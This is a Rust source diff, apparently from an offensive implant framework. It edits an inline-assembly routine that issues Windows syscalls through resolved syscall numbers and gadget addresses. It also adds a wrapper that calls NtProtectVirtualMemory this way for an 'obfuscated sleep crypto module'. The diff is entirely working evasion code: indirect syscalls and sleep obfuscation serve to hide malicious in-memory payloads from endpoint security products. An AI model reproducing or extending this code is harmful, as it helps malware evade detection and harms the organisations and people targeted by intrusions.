@@ -407,7 +407,7 @@ pub unsafe fn do_syscall(ssn: u32, gadget_addr: usize, args: &[u64]) -> i32 {
             out("rcx") _, out("rdx") _, out("r10") _, out("r11") _,
             out("r14") _,
             out("rsi") _, out("rdi") _,
-            options(nostack),
+            // NOTE: nostack intentionally removed – the asm block modifies RSP
         );
 
         status
@@ -1117,6 +1117,29 @@ pub fn do_syscall_with_strategy(func_name: &str, args: &[u64]) -> i32 {
         },
         _ => unsafe {
             crate::syscalls::do_syscall(target.ssn, target.gadget_addr, args)
+        }
+    }
+}
+
+/// Wrapper around NtProtectVirtualMemory used by the obfuscated sleep crypto module.
+/// Signature: NtProtectVirtualMemory(ProcessHandle, BaseAddress, RegionSize, NewProtect, OldProtect)
+#[cfg(windows)]
+pub unsafe fn syscall_NtProtectVirtualMemory(
+    process_handle: u64,
+    base_address: u64,
+    region_size: u64,
+    new_protect: u64,
+    old_protect: u64,
+) -> i32 {
+    match get_syscall_id("NtProtectVirtualMemory") {
+        Ok(target) => do_syscall(
+            target.ssn,
+            target.gadget_addr,
+            &[process_handle, base_address, region_size, new_protect, old_protect],
+        ),
+        Err(e) => {
+            log::warn!("syscall_NtProtectVirtualMemory: could not get SSN: {}", e);
+            -1
         }
     }
 }
